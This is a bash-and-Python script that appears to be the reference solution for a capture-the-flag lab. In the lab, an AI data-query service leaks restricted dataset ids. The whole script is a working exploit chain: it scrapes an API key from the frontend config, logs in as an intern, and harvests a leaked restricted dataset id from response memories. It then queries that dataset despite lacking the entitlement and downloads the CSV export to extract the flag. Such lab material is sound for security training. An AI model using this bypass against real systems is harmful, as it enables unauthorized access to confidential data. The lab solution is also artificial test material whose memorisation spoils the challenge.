#!/usr/bin/env bash
# ============================================================
# NusaAskScope (labs26) - reference solution: leaked AI dataset
# id -> entitlement bypass in the stream execution endpoint
#
# Chain: read frontend config -> authenticate as demo intern ->
# list allowed datasets -> run an allowed query and inspect leaked
# memories -> query the restricted dataset id -> download CSV export.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8106)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8106}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

flag="$(python3 - "$BASE" <<'PY'
import json
import re
import sys
import urllib.request

base = sys.argv[1].rstrip("/")


def request(method, path_or_url, body=None, headers=None):
    data = None
    req_headers = {"Accept": "application/json"}
    if headers:
        req_headers.update(headers)
    if body is not None:
        data = json.dumps(body).encode()
        req_headers["Content-Type"] = "application/json"
    url = path_or_url if path_or_url.startswith("http") else base + path_or_url
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    with urllib.request.urlopen(req) as response:
        return response.headers.get("Content-Type", ""), response.read().decode()


def json_request(method, path, body=None, headers=None):
    _, raw = request(method, path, body=body, headers=headers)
    return json.loads(raw)


def ndjson_request(path, body, headers):
    _, raw = request("POST", path, body=body, headers=headers)
    return [json.loads(line) for line in raw.splitlines() if line.strip()]


_, config = request("GET", "/static/config.js")
api_key = re.search(r'"apiKey":\s*"([^"]+)"', config).group(1)

auth = json_request(
    "POST",
    "/python-api/userBasedssoAuthentication",
    {"userId": "104", "attuid": "intern-104"},
    headers={"x-api-key": api_key},
)
token = auth["access_token"]
api_headers = {"x-api-key": api_key, "token": token}

datasets = json_request(
    "POST",
    "/python-api/getNusaAccessibleDatatsets",
    {"userId": "104"},
    headers=api_headers,
)
allowed_ids = {row["DATASET_ID"] for row in datasets["data"]}
first_allowed = next(iter(allowed_ids))

baseline_events = ndjson_request(
    "/python-api/streamNusaResponse",
    {
        "question": "Show top suppliers by invoice amount",
        "askdata_dataset_id": first_allowed,
        "stream": True,
    },
    api_headers,
)

restricted_dataset_id = None
for event in baseline_events:
    for memory in event.get("memories", []):
        dataset_id = memory.get("askdata_dataset_id")
        if dataset_id and dataset_id not in allowed_ids:
            restricted_dataset_id = dataset_id
            break
    if restricted_dataset_id:
        break
if not restricted_dataset_id:
    raise RuntimeError("restricted dataset id was not leaked")

restricted_events = ndjson_request(
    "/python-api/streamNusaResponse",
    {
        "question": "Show all board contracts including owner ATTUID and internal memo",
        "askdata_dataset_id": restricted_dataset_id,
        "stream": True,
    },
    api_headers,
)

export_url = None
for event in restricted_events:
    if event.get("event") == "result":
        export_url = event.get("query_result_sas_url")
        break
if not export_url:
    raise RuntimeError("no CSV export URL returned")

_, csv_body = request("GET", export_url)
match = re.search(r"FLAG\{nusasec-[0-9a-f]{32}\}", csv_body)
if not match:
    raise RuntimeError("flag not found in CSV export")
print(match.group(0))
PY
)"

if ! grep -Eq "^$FLAG_RE$" <<<"${flag:-}"; then
  echo "[-] failed: exploit did not print a valid arena flag" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
